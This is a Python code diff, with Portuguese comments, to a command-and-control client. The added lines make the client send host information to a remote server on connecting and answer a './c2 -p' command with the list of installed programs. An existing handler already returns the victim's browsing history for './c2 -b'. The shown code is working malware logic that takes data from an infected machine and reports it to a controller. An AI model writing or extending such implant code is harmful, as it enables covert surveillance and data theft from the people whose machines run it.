@@ -41,6 +41,13 @@ def realizar_conexao():
     if (status_conexao != 0):
         server_sock.close()
         return
+
+    # Enviando informações do cliente
+    try:
+        server_sock.send(funcoes.obter_informacoes().encode(CHARSET))
+    except:
+        return
+
     print("Conexão estabelecida com o servidor!")
 
     while (continuar):
@@ -51,6 +58,7 @@ def realizar_conexao():
             parar_cliente()
             continue
         except:
+            print("Conexão perdida com o servidor!")
             break
 
         # Se o tamanho da mensagem recebida for menor que 1,
@@ -62,6 +70,8 @@ def realizar_conexao():
         # Analisando mensagem do servidor e preparando resposta
         if (mensagem_recebida == "alive?"):
             mensagem_retorno = "alive!".encode(CHARSET)
+        elif ("./c2 -p" in mensagem_recebida):
+            mensagem_retorno = funcoes.obter_programas().encode(CHARSET)
         elif ("./c2 -b" in mensagem_recebida):
             mensagem_retorno = funcoes.obter_historico().encode(CHARSET)
         elif ("./c2 -q" in mensagem_recebida):
